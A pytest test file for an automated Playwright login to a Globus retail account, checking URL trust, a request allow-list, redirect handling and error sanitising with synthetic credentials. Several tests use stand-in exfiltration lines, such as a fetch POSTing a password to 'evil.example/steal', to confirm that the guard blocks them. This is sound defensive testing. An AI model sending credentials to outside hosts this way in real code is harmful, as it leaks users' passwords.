"""Synthetic browser login; no real account credentials or network authentication."""

import importlib
import json
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import BoundedSemaphore, Thread
from typing import Any
from unittest.mock import MagicMock

import pytest
from playwright.sync_api import Browser, Route, sync_playwright
from playwright.sync_api import Error as BrowserError

globus_login = importlib.import_module("cartalytix.providers.globus.login")


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/authorize",
        "https://ucet.globus.cz.evil.example/login",
        "http://ucet.globus.cz/prihlaseni/login",
        "https://user:pass@ucet.globus.cz/prihlaseni/login",
    ],
)
def test_login_rejects_untrusted_navigation(url: str) -> None:
    assert not globus_login.trusted_navigation(url)


@pytest.mark.parametrize(
    ("url", "method", "allowed"),
    [
        ("https://evil.example/steal", "POST", False),
        ("https://evil.example/steal?password=synthetic", "GET", False),
        ("http://api.ucet.globus.cz/accounts.login", "POST", False),
        ("https://api.ucet.globus.cz/accounts.login", "POST", True),
        ("https://www.google.com/recaptcha/api2/reload", "POST", True),
        ("https://www.google.com/other", "POST", False),
        ("https://cdns.eu1.gigya.com/sdk.config.get", "GET", True),
        ("https://cdns.eu1.gigya.com/sdk.config.get", "POST", False),
    ],
)
def test_browser_request_policy_limits_external_traffic(
    url: str, method: str, allowed: bool
) -> None:
    assert globus_login.allowed_request(url, method) is allowed


@pytest.fixture(scope="module")
def browser() -> Iterator[Browser]:
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(channel="chrome", headless=True)
        try:
            yield browser
        finally:
            browser.close()


def test_browser_guard_blocks_off_domain_password_post(browser: Browser) -> None:
    with browser.new_context() as context:
        context.route("**/*", globus_login.guard_request)
        context.route(
            "https://ucet.globus.cz/prihlaseni/login",
            lambda route: route.fulfill(content_type="text/html", body="Synthetic login"),
        )
        page = context.new_page()
        page.goto("https://ucet.globus.cz/prihlaseni/login")
        blocked = page.evaluate(
            """async () => {
                try {
                    await fetch('https://evil.example/steal', {
                        method:'POST', mode:'no-cors', body:'synthetic-password'
                    });
                    return false;
                } catch { return true; }
            }"""
        )
        assert blocked is True


@pytest.mark.parametrize("status", [307, 308])
def test_browser_guard_does_not_forward_password_through_redirect(
    browser: Browser, monkeypatch: pytest.MonkeyPatch, status: int
) -> None:
    forwarded: list[bytes] = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"Synthetic login")

        def do_POST(self) -> None:
            body = self.rfile.read(int(self.headers.get("Content-Length", "0")))
            if self.path == "/accounts.login":
                self.send_response(status)
                self.send_header("Location", "/steal")
            else:
                forwarded.append(body)
                self.send_response(200)
            self.end_headers()

        def log_message(self, format: str, *args: object) -> None:
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    worker = Thread(target=server.serve_forever, daemon=True)
    worker.start()
    origin = f"http://127.0.0.1:{server.server_port}"
    monkeypatch.setattr(
        globus_login,
        "allowed_request",
        lambda url, method: url in {f"{origin}/", f"{origin}/accounts.login"},
    )
    try:
        with browser.new_context() as context:
            context.route("**/*", globus_login.guard_request)
            page = context.new_page()
            page.goto(f"{origin}/")
            blocked = page.evaluate(
                """async () => {
                    try {
                        await fetch('/accounts.login', {
                            method:'POST', body:'synthetic-password'
                        });
                        return false;
                    } catch { return true; }
                }"""
            )
            assert blocked is True
            assert forwarded == []
    finally:
        server.shutdown()
        server.server_close()
        worker.join(timeout=5)


def test_browser_submits_credentials_and_captures_httponly_cookie(
    browser: Browser,
) -> None:
    submissions: list[dict[str, Any]] = []

    def respond(route: Route) -> None:
        if route.request.url.endswith("/prihlaseni/login"):
            route.fulfill(
                content_type="text/html",
                body="""<form onsubmit="event.preventDefault();
                  fetch('/accounts.login', {method:'POST', body:JSON.stringify({
                    username:this.username.value,password:this.password.value})})
                  .then(r => r.json())
                  .then(() => location.href=
                    'https://www.globus.cz/api/v2/oidc/callback')">
                  <input name="username"><input name="password" type="password">
                  <button type="submit">Sign in</button></form>""",
            )
        elif route.request.url.endswith("/accounts.login"):
            submissions.append(json.loads(route.request.post_data or "{}"))
            route.fulfill(json={"errorCode": 0})
        else:
            route.fulfill(
                body="Signed in",
                headers={"set-cookie": "oidc_session=synthetic-cookie; Secure; HttpOnly; Path=/"},
            )

    with browser.new_context() as context:
        context.route("**/*", respond)
        page = context.new_page()
        page.goto("https://ucet.globus.cz/prihlaseni/login")
        cookie, _ = globus_login.submit_login(page, "test@example.invalid", "synthetic-password", 5)
        assert cookie == "synthetic-cookie"
        assert submissions == [
            {"username": "test@example.invalid", "password": "synthetic-password"}
        ]
        assert page.evaluate("document.cookie") == ""


@pytest.mark.parametrize(
    ("code", "expected"),
    [
        (403042, "credentials_rejected"),
        (403041, "account_locked"),
        (403120, "account_locked"),
        (400021, "captcha_required"),
        (401020, "captcha_required"),
        (401021, "captcha_required"),
        (403043, "login_failed"),
        (True, "provider_response_invalid"),
        ("403042", "provider_response_invalid"),
    ],
)
def test_browser_reports_gigya_error_without_provider_message(
    browser: Browser, code: object, expected: str
) -> None:
    def respond(route: Route) -> None:
        if route.request.url.endswith("/accounts.login"):
            route.fulfill(json={"errorCode": code, "errorMessage": "private-provider-secret"})
        else:
            route.fulfill(
                content_type="text/html",
                body="""<form onsubmit="event.preventDefault();fetch('/accounts.login',
                  {method:'POST'})"><input name="username">
                  <input name="password" type="password">
                  <button type="submit">Go</button></form>""",
            )

    with browser.new_context() as context:
        context.route("**/*", respond)
        page = context.new_page()
        page.goto("https://ucet.globus.cz/prihlaseni/login")
        with pytest.raises(globus_login.GlobusError) as error:
            globus_login.submit_login(page, "test@example.invalid", "synthetic-password", 5)
    assert str(error.value) == expected
    assert "private-provider-secret" not in str(error.value)


def test_login_releases_capacity_after_browser_failure(monkeypatch: pytest.MonkeyPatch) -> None:
    slots = BoundedSemaphore(1)
    manager = MagicMock()
    manager.__enter__.return_value.chromium.launch.side_effect = BrowserError("secret-password")
    monkeypatch.setattr(globus_login, "_LOGIN_SLOTS", slots)
    monkeypatch.setattr(globus_login, "sync_playwright", lambda: manager)
    with pytest.raises(globus_login.GlobusError, match="^browser_unavailable$"):
        globus_login.login("synthetic-user", "secret-password")
    assert slots.acquire(blocking=False)
    slots.release()


def test_login_busy_never_starts_browser(monkeypatch: pytest.MonkeyPatch) -> None:
    slots = BoundedSemaphore(1)
    assert slots.acquire(blocking=False)
    manager = MagicMock()
    monkeypatch.setattr(globus_login, "_LOGIN_SLOTS", slots)
    monkeypatch.setattr(globus_login, "sync_playwright", manager)
    try:
        with pytest.raises(globus_login.GlobusError, match="^login_busy$"):
            globus_login.login("synthetic-user", "secret-password")
        manager.assert_not_called()
    finally:
        slots.release()


def test_login_closes_browser_and_releases_capacity_when_authorize_fails(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    slots = BoundedSemaphore(1)
    manager = MagicMock()
    browser = manager.__enter__.return_value.chromium.launch.return_value
    browser.new_page.return_value.evaluate.return_value = "HeadlessChrome/140"
    browser.new_context.return_value.request.get.return_value.status = 503
    monkeypatch.setattr(globus_login, "_LOGIN_SLOTS", slots)
    monkeypatch.setattr(globus_login, "sync_playwright", lambda: manager)
    with pytest.raises(globus_login.GlobusError, match="^provider_unavailable$"):
        globus_login.login("synthetic-user", "secret-password")
    browser.close.assert_called_once()
    assert slots.acquire(blocking=False)
    slots.release()


def test_login_verifies_identity_and_pins_browser_user_agent(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    manager = MagicMock()
    browser = manager.__enter__.return_value.chromium.launch.return_value
    browser.new_page.return_value.evaluate.return_value = "Mozilla/5.0 HeadlessChrome/140"
    context = browser.new_context.return_value
    context.request.get.return_value.status = 200
    context.request.get.return_value.json.return_value = {
        "authorize_url": "https://ucet.globus.cz/prihlaseni/login",
        "session_id": "synthetic-session",
    }
    identity = MagicMock()
    identity.return_value.subject = "42"
    identity.return_value.email = "synthetic@example.invalid"
    monkeypatch.setattr(globus_login, "sync_playwright", lambda: manager)
    monkeypatch.setattr(globus_login, "submit_login", lambda *args: ("synthetic-cookie", None))
    monkeypatch.setattr(globus_login, "fetch_identity", identity)
    result = globus_login.login(" synthetic-user ", "synthetic-password")
    assert result.subject == "42"
    assert result.email == "synthetic@example.invalid"
    assert result.cookie == "synthetic-cookie"
    assert result.session_id == "synthetic-session"
    assert result.user_agent == "Mozilla/5.0 Chrome/140"
    identity.assert_called_once_with("synthetic-cookie", user_agent="Mozilla/5.0 Chrome/140")
    browser.new_context.assert_called_once_with(
        locale="cs-CZ",
        user_agent="Mozilla/5.0 Chrome/140",
        accept_downloads=False,
        service_workers="block",
    )
    assert context.route_web_socket.call_count == 1
    browser.close.assert_called_once()


@pytest.mark.parametrize(
    ("identity_error", "expected"),
    [
        ("session_cookie_rejected", "login_failed"),
        ("account_identity_unavailable", "account_identity_unavailable"),
        ("rate_limited", "rate_limited"),
    ],
)
def test_login_sanitizes_identity_failures(
    monkeypatch: pytest.MonkeyPatch, identity_error: str, expected: str
) -> None:
    manager = MagicMock()
    browser = manager.__enter__.return_value.chromium.launch.return_value
    browser.new_page.return_value.evaluate.return_value = "HeadlessChrome/140"
    context = browser.new_context.return_value
    context.request.get.return_value.status = 200
    context.request.get.return_value.json.return_value = {
        "authorize_url": "https://ucet.globus.cz/prihlaseni/login",
        "session_id": "synthetic-session",
    }
    identity = MagicMock(side_effect=globus_login.GlobusError(identity_error))
    monkeypatch.setattr(globus_login, "sync_playwright", lambda: manager)
    monkeypatch.setattr(globus_login, "submit_login", lambda *args: ("synthetic-cookie", None))
    monkeypatch.setattr(globus_login, "fetch_identity", identity)
    with pytest.raises(globus_login.GlobusError, match=f"^{expected}$"):
        globus_login.login("synthetic-user", "synthetic-password")
    browser.close.assert_called_once()
